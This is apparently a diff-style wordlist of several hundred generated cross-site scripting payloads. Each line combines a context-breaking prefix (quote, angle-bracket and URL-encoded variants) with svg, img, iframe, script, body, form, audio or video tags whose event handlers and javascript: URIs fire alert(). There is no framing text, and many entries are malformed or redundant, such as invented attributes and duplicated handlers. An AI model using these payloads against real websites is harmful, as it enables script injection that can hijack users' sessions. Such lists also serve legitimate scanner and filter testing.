+>"<<svg Onkeyup='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+>"<<input Only='javascript:alert(3)' Onkeyup='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+Pjw=<svg Onkeyup='alert(1)' Onmouseover='alert(1)' Popover>alert(1)</svg>
+"><input Only='javascript:alert(3)' Onerror='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+/>%20<<img Popover='javascript:alert(3)' Onblur='alert(3)' Src='alert(1)' Data-custom='test'/>
+>"<<iframe Onselect='alert(1)' Onload='alert(1)' Href>alert(1)</iframe>
+.\>"</.<img On='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+Pjw=<form Autoplay='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-custom='test'/>
+"><svg Onblur='alert(1)' Onmouseover='alert(1)' On>alert(1)</svg>
+><<video On Onselect='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+'>\"<script Onselect='alert(1)' Type='alert(1)' Only>alert(1)</script>
+./>%20<./<img On='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+Pjw=<iframe Onsubmit='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+Pjw=<script Onsubmit='alert(1)' Type='alert(1)' Autofocus>alert(1)</script>
+Pjw=<audio On Onfocus='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+%3e%3c<video Autoplay Onchange='alert(2)' Src='alert(1)' Data-xss='test'></video>
+/>%20<<audio Autoplay Onsubmit='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+/>%20<<body Href='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-custom='test'/>
+%3e%3c<video Autoplay Onblur='alert(2)' Src='alert(1)' Data-xss='test'></video>
+"><video Only Onkeydown='alert(2)' Onplay='alert(1)' Data-info='test'></video>
+%3e%3c<body On='javascript:alert(3)' Onchange='alert(3)' Onload='alert(1)' Data-custom='test'/>
+\"><audio Only Onerror='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+<"<form Only='javascript:alert(3)' Onmouseover='alert(3)' Onsubmit='alert(1)' Data-custom='test'/>
+\"><audio Autoplay Onkeyup='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+.\>"</.<input Only='javascript:alert(3)' Onsubmit='alert(3)' Onchange='alert(1)' Data-custom='test'/>
+%3e%3c<form Href='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-test='test'/>
+\"><img Autofocus='javascript:alert(3)' Onfocus='alert(3)' Alt='alert(1)' Data-custom='test'/>
+>"<<svg Onpaste='alert(1)' Onload='alert(1)' Popover>alert(1)</svg>
+'>\"<video On Onkeyup='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+>"<<iframe Oninput='alert(1)' Onload='alert(1)' Only>alert(1)</iframe>
+'>\"<audio Autofocus Onpaste='alert(2)' Src='alert(1)' Data-custom='test'></audio>
+/>%20<<img Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Src='alert(1)' Data-test='test'/>
+Pjw=<input Only='javascript:alert(3)' Onkeydown='alert(3)' Onchange='alert(1)' Data-custom='test'/>
+Pjw=<video Autoplay Onblur='alert(2)' Src='alert(1)' Data-custom='test'></video>
+./>%20<./<iframe Onkeyup='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+><<iframe Onerror='alert(1)' Onload='alert(1)' Autoplay>alert(1)</iframe>
+<"<body Autofocus='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+%20/%20><iframe Onpaste='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+%20">%20<<svg Onkeydown='alert(1)' Style='alert(1)' Autofocus>alert(1)</svg>
+<"<svg Onkeyup='alert(1)' Onload='alert(1)' On>alert(1)</svg>
+./>%20<./<form Only='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+\"><form Autoplay='javascript:alert(3)' Onpaste='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+%3e%3c<form Popover='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+%20/%20><script Onpaste='alert(1)' Src='alert(1)' Href>alert(1)</script>
+"><iframe Onblur='alert(1)' Src='alert(1)' Popover>alert(1)</iframe>
+Pjw=<img Autofocus='javascript:alert(3)' Onload='alert(3)' Src='alert(1)' Data-custom='test'/>
+'>\"<form Only='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+<"<script Ontoggle='alert(1)' Type='alert(1)' Href>alert(1)</script>
+"><iframe Onblur='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+%20/%20><form Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-custom='test'/>
+"><audio Autoplay Oninput='alert(2)' Autoplay='alert(1)' Data-test='test'></audio>
+Pjw=<script Onpaste='alert(1)' Src='alert(1)' On>alert(1)</script>
+%20/%20><iframe Onclick='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+%20">%20<<img Href='javascript:alert(3)' Onmouseover='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+<"<iframe Onblur='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+"><iframe Onselect='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+"><input Popover='javascript:alert(3)' Ontoggle='alert(3)' Value='alert(1)' Data-test='test'/>
+Pjw=<form Href='javascript:alert(3)' Onkeyup='alert(3)' Action='alert(1)' Data-test='test'/>
+/>%20<<body Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-test='test'/>
+%20">%20<<iframe Oninput='alert(1)' Onload='alert(1)' Popover>alert(1)</iframe>
+\"><script Onload='alert(1)' Src='alert(1)' Href>alert(1)</script>
+.\>"</.<form Autoplay='javascript:alert(3)' Onclick='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+<"<iframe Onerror='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+.\>"</.<video On Onpaste='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+\"><input Autoplay='javascript:alert(3)' Onfocus='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+%20/%20><iframe Onmouseover='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+.\>"</.<iframe Onselect='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+\"><audio Autoplay Ontoggle='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+>"<<svg Onload='alert(1)' Onload='alert(1)' Popover>alert(1)</svg>
+>"<<img Autoplay='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+><<iframe Onpaste='alert(1)' Onload='alert(1)' Popover>alert(1)</iframe>
+<"<iframe Onkeyup='alert(1)' Onload='alert(1)' Autofocus>alert(1)</iframe>
+Pjw=<form Popover='javascript:alert(3)' Onload='alert(3)' Action='alert(1)' Data-info='test'/>
+.\>"</.<audio Autoplay Onpaste='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+%20">%20<<input Popover='javascript:alert(3)' Onkeyup='alert(3)' Value='alert(1)' Data-test='test'/>
+><<audio On Onchange='alert(2)' Onplay='alert(1)' Data-xss='test'></audio>
+"><input Autoplay='javascript:alert(3)' Onclick='alert(3)' Onchange='alert(1)' Data-info='test'/>
+./>%20<./<svg Onload='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+/>%20<<audio Href Onpaste='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+<"<form Popover='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+./>%20<./<body Href='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-xss='test'/>
+"><svg Onkeyup='alert(1)' Style='alert(1)' Popover>alert(1)</svg>
+\"><iframe Onselect='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+/>%20<<input Only='javascript:alert(3)' Ontoggle='alert(3)' Onfocus='alert(1)' Data-xss='test'/>
+/>%20<<video Only Onpaste='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+.\>"</.<svg Onchange='alert(1)' Style='alert(1)' On>alert(1)</svg>
+'>\"<video Popover Onsubmit='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+\"><video On Onpaste='alert(2)' Src='alert(1)' Data-info='test'></video>
+<"<script Onclick='alert(1)' Src='alert(1)' Href>alert(1)</script>
+/>%20<<form Href='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-xss='test'/>
+<"<script Onchange='alert(1)' Type='alert(1)' On>alert(1)</script>
+"><script Onchange='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+Pjw=<script Onselect='alert(1)' Src='alert(1)' Autofocus>alert(1)</script>
+./>%20<./<body On='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-info='test'/>
+.\>"</.<form Autoplay='javascript:alert(3)' Onkeyup='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+><<input Popover='javascript:alert(3)' Onpaste='alert(3)' Value='alert(1)' Data-info='test'/>
+><<img Popover='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-info='test'/>
+<"<svg Ontoggle='alert(1)' Onmouseover='alert(1)' Href>alert(1)</svg>
+.\>"</.<img Only='javascript:alert(3)' Onerror='alert(3)' Alt='alert(1)' Data-xss='test'/>
+/>%20<<script Onerror='alert(1)' Src='alert(1)' Only>alert(1)</script>
+>"<<svg Onsubmit='alert(1)' Onmouseover='alert(1)' Popover>alert(1)</svg>
+.\>"</.<body Autofocus='javascript:alert(3)' Onmouseover='alert(3)' Onload='alert(1)' Data-info='test'/>
+Pjw=<body Href='javascript:alert(3)' Onmouseover='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+><<svg Onpaste='alert(1)' Style='alert(1)' Autofocus>alert(1)</svg>
+.\>"</.<script Onsubmit='alert(1)' Src='alert(1)' Autofocus>alert(1)</script>
+/>%20<<img Only='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+/>%20<<form Autoplay='javascript:alert(3)' Onclick='alert(3)' Action='alert(1)' Data-test='test'/>
+%20/%20><script Onclick='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+%3e%3c<input Only='javascript:alert(3)' Onselect='alert(3)' Value='alert(1)' Data-xss='test'/>
+%20/%20><audio Autofocus Onfocus='alert(2)' Src='alert(1)' Data-info='test'></audio>
+>"<<input On='javascript:alert(3)' Onpaste='alert(3)' Value='alert(1)' Data-test='test'/>
+\"><form Popover='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+<"<video Only Onfocus='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+Pjw=<img Autoplay='javascript:alert(3)' Onload='alert(3)' Alt='alert(1)' Data-xss='test'/>
+%3e%3c<audio Autofocus Onselect='alert(2)' Src='alert(1)' Data-xss='test'></audio>
+><<iframe Onselect='alert(1)' Onload='alert(1)' Href>alert(1)</iframe>
+\"><iframe Onpaste='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+.\>"</.<svg Onsubmit='alert(1)' Onload='alert(1)' Autofocus>alert(1)</svg>
+./>%20<./<svg Onkeydown='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+"><iframe Onkeyup='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+./>%20<./<iframe Oninput='alert(1)' Onload='alert(1)' Href>alert(1)</iframe>
+%20/%20><video Autofocus Onchange='alert(2)' Src='alert(1)' Data-test='test'></video>
+"><iframe Onselect='alert(1)' Onload='alert(1)' Only>alert(1)</iframe>
+.\>"</.<video On Ontoggle='alert(2)' Autoplay='alert(1)' Data-custom='test'></video>
+./>%20<./<input Autofocus='javascript:alert(3)' Onpaste='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+Pjw=<svg Onfocus='alert(1)' Style='alert(1)' Autoplay>alert(1)</svg>
+'>\"<script Onclick='alert(1)' Type='alert(1)' On>alert(1)</script>
+/>%20<<img Href='javascript:alert(3)' Onselect='alert(3)' Alt='alert(1)' Data-xss='test'/>
+'>\"<img Autofocus='javascript:alert(3)' Onfocus='alert(3)' Alt='alert(1)' Data-test='test'/>
+"><svg Onblur='alert(1)' Onload='alert(1)' Href>alert(1)</svg>
+>"<<input On='javascript:alert(3)' Onfocus='alert(3)' Onfocus='alert(1)' Data-xss='test'/>
+\"><video Only Onerror='alert(2)' Src='alert(1)' Data-test='test'></video>
+Pjw=<form Only='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-test='test'/>
+%3e%3c<script Onkeyup='alert(1)' Src='alert(1)' Popover>alert(1)</script>
+>"<<form Only='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-custom='test'/>
+\"><img Autoplay='javascript:alert(3)' Onblur='alert(3)' Src='alert(1)' Data-custom='test'/>
+Pjw=<input Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Value='alert(1)' Data-custom='test'/>
+/>%20<<img Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+%20/%20><body Popover='javascript:alert(3)' Onpaste='alert(3)' Onload='alert(1)' Data-custom='test'/>
+'>\"<audio Href Onclick='alert(2)' Onplay='alert(1)' Data-xss='test'></audio>
+./>%20<./<body Href='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-info='test'/>
+>"<<video Only Onmouseover='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+/>%20<<iframe Onclick='alert(1)' Onload='alert(1)' Autofocus>alert(1)</iframe>
+/>%20<<img Popover='javascript:alert(3)' Onchange='alert(3)' Src='alert(1)' Data-xss='test'/>
+\"><img Autofocus='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-test='test'/>
+\"><script Onkeyup='alert(1)' Type='alert(1)' Only>alert(1)</script>
+%20/%20><video Autoplay Onsubmit='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+"><svg Onkeydown='alert(1)' Onload='alert(1)' Href>alert(1)</svg>
+./>%20<./<iframe Onerror='alert(1)' Onload='alert(1)' Autoplay>alert(1)</iframe>
+\"><img Popover='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-test='test'/>
+/>%20<<iframe Onkeyup='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+><<audio Autofocus Onchange='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+.\>"</.<form Autoplay='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-test='test'/>
+<"<audio Autofocus Onclick='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+.\>"</.<body Only='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+Pjw=<script Oninput='alert(1)' Type='alert(1)' Href>alert(1)</script>
+%20/%20><iframe Onkeyup='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+'>\"<audio Autoplay Onmouseover='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+"><svg Onselect='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+./>%20<./<video Autofocus Onclick='alert(2)' Onplay='alert(1)' Data-xss='test'></video>
+<"<body Only='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-info='test'/>
+'>\"<form Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-custom='test'/>
+%3e%3c<input Href='javascript:alert(3)' Onselect='alert(3)' Onchange='alert(1)' Data-xss='test'/>
+.\>"</.<svg Onchange='alert(1)' Style='alert(1)' Popover>alert(1)</svg>
+/>%20<<form Href='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+./>%20<./<form Autofocus='javascript:alert(3)' Onfocus='alert(3)' Action='alert(1)' Data-custom='test'/>
+>"<<audio Popover Onselect='alert(2)' Onplay='alert(1)' Data-info='test'></audio>
+\"><iframe Oninput='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+%20/%20><iframe Onerror='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+./>%20<./<script Onsubmit='alert(1)' Src='alert(1)' Autofocus>alert(1)</script>
+"><video Href Ontoggle='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+%20">%20<<audio On Onsubmit='alert(2)' Src='alert(1)' Data-test='test'></audio>
+%3e%3c<form Autofocus='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-test='test'/>
+.\>"</.<video Href Onselect='alert(2)' Src='alert(1)' Data-custom='test'></video>
+%20">%20<<svg Onblur='alert(1)' Style='alert(1)' On>alert(1)</svg>
+><<input Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Onchange='alert(1)' Data-custom='test'/>
+"><img On='javascript:alert(3)' Onkeydown='alert(3)' Alt='alert(1)' Data-test='test'/>
+.\>"</.<iframe Onselect='alert(1)' Onload='alert(1)' Href>alert(1)</iframe>
+%3e%3c<input Href='javascript:alert(3)' Onkeyup='alert(3)' Onchange='alert(1)' Data-xss='test'/>
+'>\"<input Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Value='alert(1)' Data-custom='test'/>
+%20">%20<<iframe Onfocus='alert(1)' Onload='alert(1)' Popover>alert(1)</iframe>
+%20/%20><svg Onpaste='alert(1)' Onload='alert(1)' Autofocus>alert(1)</svg>
+/>%20<<img On='javascript:alert(3)' Onclick='alert(3)' Alt='alert(1)' Data-xss='test'/>
+<"<iframe Onfocus='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+>"<<video Popover Onsubmit='alert(2)' Src='alert(1)' Data-test='test'></video>
+./>%20<./<form On='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-test='test'/>
+./>%20<./<video Only Onfocus='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+%20">%20<<audio Only Onerror='alert(2)' Src='alert(1)' Data-info='test'></audio>
+'>\"<video On Ontoggle='alert(2)' Src='alert(1)' Data-custom='test'></video>
+%3e%3c<iframe Onfocus='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+><<body Autofocus='javascript:alert(3)' Onchange='alert(3)' Onload='alert(1)' Data-xss='test'/>
+\"><img Only='javascript:alert(3)' Onerror='alert(3)' Src='alert(1)' Data-test='test'/>
+><<svg Onload='alert(1)' Onmouseover='alert(1)' Popover>alert(1)</svg>
+%3e%3c<svg Onkeyup='alert(1)' Style='alert(1)' Only>alert(1)</svg>
+><<iframe Onfocus='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+\"><svg Oninput='alert(1)' Onmouseover='alert(1)' Popover>alert(1)</svg>
+\"><video Href Onclick='alert(2)' Src='alert(1)' Data-custom='test'></video>
+>"<<svg Onload='alert(1)' Onload='alert(1)' Autofocus>alert(1)</svg>
+Pjw=<svg Onfocus='alert(1)' Style='alert(1)' Popover>alert(1)</svg>
+><<iframe Onkeyup='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+>"<<audio Popover Onerror='alert(2)' Onplay='alert(1)' Data-info='test'></audio>
+/>%20<<body On='javascript:alert(3)' Onkeyup='alert(3)' Onload='alert(1)' Data-info='test'/>
+><<script Onchange='alert(1)' Type='alert(1)' Href>alert(1)</script>
+.\>"</.<script Onfocus='alert(1)' Src='alert(1)' On>alert(1)</script>
+><<input Popover='javascript:alert(3)' Ontoggle='alert(3)' Onchange='alert(1)' Data-test='test'/>
+./>%20<./<img On='javascript:alert(3)' Onmouseover='alert(3)' Alt='alert(1)' Data-custom='test'/>
+>"<<form Href='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-info='test'/>
+%3e%3c<img On='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-info='test'/>
+./>%20<./<body Popover='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-custom='test'/>
+\"><script Onload='alert(1)' Type='alert(1)' On>alert(1)</script>
+Pjw=<audio Popover Onkeyup='alert(2)' Onplay='alert(1)' Data-custom='test'></audio>
+<"<video Autoplay Oninput='alert(2)' Onplay='alert(1)' Data-xss='test'></video>
+./>%20<./<img On='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+.\>"</.<form Popover='javascript:alert(3)' Onchange='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+%20">%20<<script Onkeyup='alert(1)' Src='alert(1)' Popover>alert(1)</script>
+%20">%20<<form Popover='javascript:alert(3)' Onmouseover='alert(3)' Onsubmit='alert(1)' Data-custom='test'/>
+'>\"<body Popover='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-info='test'/>
+/>%20<<input On='javascript:alert(3)' Onselect='alert(3)' Onfocus='alert(1)' Data-xss='test'/>
+%3e%3c<input On='javascript:alert(3)' Onkeyup='alert(3)' Value='alert(1)' Data-xss='test'/>
+%20">%20<<script Ontoggle='alert(1)' Src='alert(1)' Only>alert(1)</script>
+<"<script Onkeyup='alert(1)' Src='alert(1)' On>alert(1)</script>
+>"<<script Onchange='alert(1)' Src='alert(1)' Popover>alert(1)</script>
+Pjw=<input Href='javascript:alert(3)' Onload='alert(3)' Value='alert(1)' Data-test='test'/>
+Pjw=<input Autoplay='javascript:alert(3)' Onchange='alert(3)' Onchange='alert(1)' Data-xss='test'/>
+%3e%3c<script Onkeyup='alert(1)' Type='alert(1)' On>alert(1)</script>
+%20">%20<<input Autoplay='javascript:alert(3)' Onblur='alert(3)' Value='alert(1)' Data-custom='test'/>
+./>%20<./<iframe Onclick='alert(1)' Onload='alert(1)' Href>alert(1)</iframe>
+>"<<input Popover='javascript:alert(3)' Onload='alert(3)' Value='alert(1)' Data-xss='test'/>
+\"><script Onclick='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+<"<script Onsubmit='alert(1)' Src='alert(1)' Href>alert(1)</script>
+'>\"<audio Autofocus Onselect='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+.\>"</.<body Href='javascript:alert(3)' Ontoggle='alert(3)' Onerror='alert(1)' Data-test='test'/>
+/>%20<<img Autofocus='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-test='test'/>
+%3e%3c<body Popover='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+\"><body Autofocus='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-info='test'/>
+'>\"<form Only='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-test='test'/>
+.\>"</.<audio Autoplay Onmouseover='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+><<form Autoplay='javascript:alert(3)' Onkeyup='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+%20/%20><img Popover='javascript:alert(3)' Oninput='alert(3)' Alt='alert(1)' Data-custom='test'/>
+%20/%20><input Autoplay='javascript:alert(3)' Onblur='alert(3)' Onfocus='alert(1)' Data-test='test'/>
+<"<form Autofocus='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+%20">%20<<script Onselect='alert(1)' Src='alert(1)' Only>alert(1)</script>
+>"<<svg Onclick='alert(1)' Onload='alert(1)' Autofocus>alert(1)</svg>
+<"<body Href='javascript:alert(3)' Onselect='alert(3)' Onerror='alert(1)' Data-info='test'/>
+<"<input On='javascript:alert(3)' Onkeyup='alert(3)' Onchange='alert(1)' Data-info='test'/>
+Pjw=<svg Ontoggle='alert(1)' Onmouseover='alert(1)' On>alert(1)</svg>
+.\>"</.<input Popover='javascript:alert(3)' Oninput='alert(3)' Value='alert(1)' Data-xss='test'/>
+./>%20<./<script Onkeyup='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+%3e%3c<img On='javascript:alert(3)' Onsubmit='alert(3)' Alt='alert(1)' Data-info='test'/>
+><<form Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-xss='test'/>
+%3e%3c<iframe Onfocus='alert(1)' Onload='alert(1)' Popover>alert(1)</iframe>
+%20/%20><video Autofocus Oninput='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+>"<<img Autofocus='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-test='test'/>
+./>%20<./<svg Onselect='alert(1)' Onload='alert(1)' Autofocus>alert(1)</svg>
+'>\"<script Onfocus='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+%20/%20><body Autoplay='javascript:alert(3)' Onerror='alert(3)' Onload='alert(1)' Data-xss='test'/>
+>"<<iframe Oninput='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+<"<script Onselect='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+'>\"<img Only='javascript:alert(3)' Onmouseover='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+%20">%20<<body On='javascript:alert(3)' Onmouseover='alert(3)' Onload='alert(1)' Data-test='test'/>
+<"<script Onsubmit='alert(1)' Type='alert(1)' Href>alert(1)</script>
+Pjw=<video On Ontoggle='alert(2)' Src='alert(1)' Data-test='test'></video>
+%20">%20<<form Popover='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+.\>"</.<img Popover='javascript:alert(3)' Onfocus='alert(3)' Alt='alert(1)' Data-xss='test'/>
+><<img Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Src='alert(1)' Data-test='test'/>
+><<input On='javascript:alert(3)' Onkeydown='alert(3)' Onchange='alert(1)' Data-xss='test'/>
+%3e%3c<video Autoplay Onerror='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+Pjw=<input Href='javascript:alert(3)' Onselect='alert(3)' Onchange='alert(1)' Data-info='test'/>
+/>%20<<body Only='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-test='test'/>
+Pjw=<form Popover='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+%3e%3c<form Popover='javascript:alert(3)' Onkeydown='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+%3e%3c<form Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-custom='test'/>
+><<script Onblur='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+%20/%20><input Href='javascript:alert(3)' Onclick='alert(3)' Onfocus='alert(1)' Data-test='test'/>
+><<form Href='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+%3e%3c<iframe Onfocus='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+%20/%20><video Only Ontoggle='alert(2)' Src='alert(1)' Data-info='test'></video>
+./>%20<./<body Only='javascript:alert(3)' Onkeyup='alert(3)' Onload='alert(1)' Data-info='test'/>
+'>\"<input Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Value='alert(1)' Data-test='test'/>
+./>%20<./<body Popover='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+%20">%20<<audio Autofocus Onfocus='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+\"><body Popover='javascript:alert(3)' Onmouseover='alert(3)' Onload='alert(1)' Data-custom='test'/>
+><<form Autofocus='javascript:alert(3)' Onload='alert(3)' Action='alert(1)' Data-info='test'/>
+%20/%20><input Autoplay='javascript:alert(3)' Onerror='alert(3)' Value='alert(1)' Data-info='test'/>
+%20/%20><img On='javascript:alert(3)' Onblur='alert(3)' Alt='alert(1)' Data-xss='test'/>
+%3e%3c<audio Popover Onkeyup='alert(2)' Src='alert(1)' Data-custom='test'></audio>
+\"><video Popover Onchange='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+>"<<img Popover='javascript:alert(3)' Oninput='alert(3)' Alt='alert(1)' Data-test='test'/>
+'>\"<input Autoplay='javascript:alert(3)' Onsubmit='alert(3)' Onchange='alert(1)' Data-test='test'/>
+\"><script Onchange='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+Pjw=<img Only='javascript:alert(3)' Onmouseover='alert(3)' Src='alert(1)' Data-info='test'/>
+/>%20<<input Href='javascript:alert(3)' Onload='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+'>\"<video Autofocus Onload='alert(2)' Autoplay='alert(1)' Data-xss='test'></video>
+/>%20<<img Autofocus='javascript:alert(3)' Onchange='alert(3)' Alt='alert(1)' Data-info='test'/>
+\"><input Popover='javascript:alert(3)' Onblur='alert(3)' Value='alert(1)' Data-test='test'/>
+Pjw=<script Onload='alert(1)' Src='alert(1)' Popover>alert(1)</script>
+"><form On='javascript:alert(3)' Onblur='alert(3)' Action='alert(1)' Data-test='test'/>
+'>\"<img Popover='javascript:alert(3)' Onsubmit='alert(3)' Alt='alert(1)' Data-test='test'/>
+>"<<audio Only Onclick='alert(2)' Src='alert(1)' Data-xss='test'></audio>
+'>\"<iframe Onclick='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+.\>"</.<svg Onclick='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+><<iframe Oninput='alert(1)' Onload='alert(1)' Autofocus>alert(1)</iframe>
+'>\"<video Autoplay Onclick='alert(2)' Src='alert(1)' Data-xss='test'></video>
+./>%20<./<video Href Onblur='alert(2)' Src='alert(1)' Data-test='test'></video>
+/>%20<<script Onblur='alert(1)' Src='alert(1)' Autofocus>alert(1)</script>
+%20">%20<<video Href Onkeyup='alert(2)' Autoplay='alert(1)' Data-xss='test'></video>
+\"><iframe Ontoggle='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+%20/%20><form On='javascript:alert(3)' Onkeyup='alert(3)' Action='alert(1)' Data-custom='test'/>
+Pjw=<body Href='javascript:alert(3)' Onselect='alert(3)' Onerror='alert(1)' Data-info='test'/>
